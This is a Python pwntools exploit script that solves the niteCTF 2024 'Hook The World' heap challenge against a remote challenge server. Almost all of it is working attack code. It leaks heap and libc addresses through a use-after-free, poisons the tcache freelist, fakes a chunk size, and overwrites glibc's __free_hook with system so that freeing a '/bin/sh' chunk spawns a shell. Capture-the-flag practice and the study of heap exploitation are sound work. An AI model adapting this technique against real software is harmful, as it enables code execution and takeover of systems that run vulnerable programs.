#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "hook-the-world.chals.nitectf2024.live", 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
#└─# pwn checksec chall_patched
#[*] '/home/kali/Windows/niteCTF 2024/Hook The World/chall_patched'
#    Arch:       amd64-64-little
#    RELRO:      Full RELRO
#    Stack:      Canary found
#    NX:         NX enabled
#    PIE:        PIE enabled
#    RUNPATH:    b'.'
#    Stripped:   No



def malloc(idx, size):
    io.sendlineafter(">", "1")
    io.sendlineafter("Chest number:", str(idx).encode())
    io.sendlineafter("Chest size:", str(size).encode())

def free(idx):
    io.sendlineafter(">", "2")
    io.sendlineafter("Idiot crew memebr #:", str(idx).encode())

def edit(idx, input):
    io.sendlineafter(">", "3")
    io.sendlineafter(">", str(idx).encode())
    io.sendline(input)

def view(idx):
    io.sendlineafter(">", "4")
    io.sendlineafter("Chest no:", str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val


def exploit():
    global io
    io = initialize()
    malloc(0, 0x28)
    malloc(1, 0x28)
    free(0)
    view(0)
    io.recv(8)
    heap = (u64(io.recv(8).strip().ljust(8, b"\x00")) >> 12) << 12
    log.info("Heap base: %#x", heap)

    fd = heap + 0x288
    bk = heap + 0x010
    free(1)
    edit(1, p64(fd) + p64(bk))
    malloc(2, 0x28)
    malloc(3, 0x28)
    malloc(4, 0xf8)
    malloc(5, 0xf8)
    malloc(6, 0xf8)
    malloc(7, 0xf8)
    malloc(8, 0xf8)
    edit(3, p64(0x431)) #Overwriting the size to enough leak LIBC
    free(2) # Leak Libc
    view(2)
    libcleak = (u64(io.recv(8).strip().ljust(8, b"\x00")))
    libc.address = libcleak - 0x3ebca0
    log.info("Libc leak: %#x", libcleak) 
    log.info("Libc base: %#x", libc.address) 

    # Getting Shell
    malloc(9, 0x48)
    malloc(10, 0x48)
    free(10)
    free(9)
    edit(9, p64(libc.sym["__free_hook"]))
    malloc(11, 0x48)
    edit(11,  b"/bin/sh\0")
    malloc(12, 0x48)
    edit(12, p64(libc.sym["system"])) #Overwrite __free_hook with system
    free(11) 
    io.interactive()
    
if __name__ == '__main__':
    exploit()
